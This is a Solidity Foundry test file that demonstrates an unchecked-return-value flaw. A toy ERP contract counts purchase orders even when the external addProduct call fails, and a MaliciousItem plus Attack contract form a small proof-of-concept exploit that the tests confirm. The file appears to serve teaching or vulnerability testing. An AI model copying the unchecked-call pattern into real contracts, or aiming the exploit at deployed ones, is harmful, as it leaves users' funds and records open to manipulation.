pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contracts as provided with the vulnerability

// Contract Item: does not properly check the returned value
contract Item {
    // addProduct erroneously returns false to simulate failure
    function addProduct() external returns (bool) {
        // Simulate failure by returning false
        return false;
    }
}

// ContractERP calls external addProduct without proper return value checking
contract ContractERP {
    uint public orderCount = 0; // Represents the number of purchase orders

    function newPurchaseOrder(Item product) public {
        // VULNERABILITY: the return value from product.addProduct() is not checked
        product.addProduct();
        // Even if addProduct fails, orderCount is incremented
        orderCount++;
    }
}

// MaliciousItem: simulates a malicious contract that returns false from addProduct
contract MaliciousItem {
    function addProduct() external returns (bool) {
        // Deliberately return false to simulate unsuccessful product addition
        return false;
    }
}

// Attack contract: uses MaliciousItem with ContractERP to exploit the vulnerability
contract Attack {
    ContractERP public erp;
    MaliciousItem public maliciousItem;

    constructor() {
        // Deploy ContractERP and MaliciousItem
        erp = new ContractERP();
        maliciousItem = new MaliciousItem();
    }

    // executeAttack calls ContractERP.newPurchaseOrder with the malicious item
    function executeAttack() public {
        // Because ContractERP does not check the return value,
        // even though maliciousItem.addProduct() fails (returns false),
        // the orderCount is incremented
        erp.newPurchaseOrder(Item(address(maliciousItem)));
    }
}

// Forge test contract to demonstrate the vulnerability
contract VulnerabilityTest is Test {
    function testAttackExploitsImproperReturnValueCheck() public {
        // Deploy the Attack contract which in turn deploys ContractERP and MaliciousItem
        Attack attack = new Attack();
        ContractERP erp = attack.erp();

        // Check initial state
        assertEq(erp.orderCount(), 0, "Initial orderCount should be 0");

        // Call the attack, which should incorrectly increment orderCount
        attack.executeAttack();

        // Vulnerability demonstration: even though addProduct returned false, orderCount is incremented
        assertEq(erp.orderCount(), 1, "Vulnerability exploited: orderCount incremented despite addProduct failure");
    }

    // Additional test: directly use MaliciousItem with ContractERP
    function testDirectCallWithMaliciousItem() public {
        // Deploy the contracts directly
        ContractERP erp = new ContractERP();
        MaliciousItem malicious = new MaliciousItem();

        // Call newPurchaseOrder with the malicious item
        erp.newPurchaseOrder(Item(address(malicious)));

        // Even though malicious.addProduct() returns false, the orderCount is still incremented
        assertEq(erp.orderCount(), 1, "Vulnerability exploited: orderCount incremented despite malicious addProduct returning false");
    }
}
